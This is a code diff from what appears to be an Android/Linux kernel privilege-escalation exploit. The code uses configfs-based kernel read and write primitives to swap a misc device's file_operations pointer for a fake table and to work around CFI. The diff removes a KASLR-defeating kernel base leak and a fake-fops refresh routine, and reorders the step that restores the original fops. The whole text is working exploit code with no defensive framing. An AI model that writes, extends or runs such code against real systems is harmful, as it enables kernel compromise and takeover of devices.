@@ -16,19 +16,8 @@ int cfi_dirty_seen;
 int cfi_last_step;
 int cfi_last_errno;
 int kaslr_done;
-int kaslr_step;
-uint64_t kaslr_fops_alias;
-uint64_t kaslr_open_ptr;
-uint64_t kaslr_ioctl_ptr;
-uint64_t kaslr_mmap_ptr;
-uint64_t kaslr_release_ptr;
-uint64_t kaslr_show_fdinfo_ptr;
 uint64_t kaslr_base;
 uint64_t kaslr_slide;
-uint64_t kaslr_expected_ioctl;
-uint64_t kaslr_expected_mmap;
-uint64_t kaslr_expected_release;
-uint64_t kaslr_expected_show_fdinfo;
 uint64_t slide_bootid_before;
 uint64_t slide_bootid_after;
 uint64_t slide_bootid_want;
@@ -55,11 +44,6 @@ static int route_delay_usec(int attempt) {
 void fdset_put_word(fd_set *set, int word, uint64_t value) {
   unsigned long *bits = (unsigned long *)set;
   bits[word] = (unsigned long)value;
-}
-
-uint64_t fdset_get_word(const fd_set *set, int word) {
-  const unsigned long *bits = (const unsigned long *)set;
-  return bits[word];
 }
 
 void open_selected_fds(
@@ -199,76 +183,6 @@ int repair_fake_fops_llseek(int fd) {
          after == llseek;
 }
 
-int refresh_fake_fops_text(int fd) {
-  struct fops_slot {
-    size_t off;
-    uint64_t value;
-  } slots[] = {
-    {FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER)},
-    {FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
-    {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL)},
-    {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
-    {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
-    {FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN)},
-    {FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE)},
-    {FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ)},
-    {FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO)},
-  };
-
-  for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); i++) {
-    uintptr_t target = fake_fops + slots[i].off;
-    if (kernel_write_data(fd, target, &slots[i].value,
-        sizeof(slots[i].value)) !=
-        (ssize_t)sizeof(slots[i].value)) {
-      return 0;
-    }
-  }
-  return 1;
-}
-
-int leak_kernel_base(int fd) {
-  kaslr_fops_alias = data_addr(ASHMEM_FOPS);
-  kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);
-  kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);
-  kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);
-  kaslr_release_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_RELEASE_OFF);
-  kaslr_show_fdinfo_ptr =
-    kernel_read64(fd, kaslr_fops_alias + FOPS_SHOW_FDINFO_OFF);
-
-  if (!is_kernel_ptr(kaslr_open_ptr) || !is_kernel_ptr(kaslr_ioctl_ptr) ||
-      !is_kernel_ptr(kaslr_mmap_ptr) || !is_kernel_ptr(kaslr_release_ptr) ||
-      !is_kernel_ptr(kaslr_show_fdinfo_ptr)) {
-    kaslr_step = 1;
-    return 0;
-  }
-
-  kaslr_base = kaslr_open_ptr - (ASHMEM_OPEN - KIMAGE_TEXT_BASE);
-  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
-  kaslr_done = 1;
-  kaslr_expected_ioctl = text_addr(ASHMEM_IOCTL);
-  kaslr_expected_mmap = text_addr(ASHMEM_MMAP);
-  kaslr_expected_release = text_addr(ASHMEM_RELEASE);
-  kaslr_expected_show_fdinfo = text_addr(ASHMEM_SHOW_FDINFO);
-
-  if (kaslr_ioctl_ptr != kaslr_expected_ioctl ||
-      kaslr_mmap_ptr != kaslr_expected_mmap ||
-      kaslr_release_ptr != kaslr_expected_release ||
-      kaslr_show_fdinfo_ptr != kaslr_expected_show_fdinfo) {
-    kaslr_done = 0;
-    kaslr_step = 2;
-    return 0;
-  }
-
-  if (!refresh_fake_fops_text(fd)) {
-    kaslr_done = 0;
-    kaslr_step = 3;
-    return 0;
-  }
-
-  kaslr_step = 0;
-  return 1;
-}
-
 int restore_slide_boot_id(int fd) {
   uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA + slide_p0_offset;
   slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
@@ -378,11 +292,21 @@ int try_cfi_stage(void) {
     goto fail;
   }
 
+  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
+  ssize_t restore = configfs_write_once(
+      fd, misc_fops, &original_fops, sizeof(original_fops));
+  cfi_restore_ret = restore;
+  if (restore != (ssize_t)sizeof(original_fops)) {
+    cfi_last_step = 5;
+    cfi_last_errno = errno;
+    goto fail;
+  }
+
   uint64_t before = 0;
   ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
   fops_before = before;
-  if (rb != (ssize_t)sizeof(before) || before != fake_fops) {
-    cfi_last_step = 4;
+  if (rb != (ssize_t)sizeof(before) || before != original_fops) {
+    cfi_last_step = 6;
     cfi_last_errno = errno;
     goto fail;
   }
@@ -418,16 +342,6 @@ int try_cfi_stage(void) {
 
   if (!installed) {
     cfi_last_step = 8;
-    cfi_last_errno = errno;
-    goto fail;
-  }
-
-  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
-  ssize_t restore = configfs_write_once(
-      fd, misc_fops, &original_fops, sizeof(original_fops));
-  cfi_restore_ret = restore;
-  if (restore != (ssize_t)sizeof(original_fops)) {
-    cfi_last_step = 5;
     cfi_last_errno = errno;
     goto fail;
   }
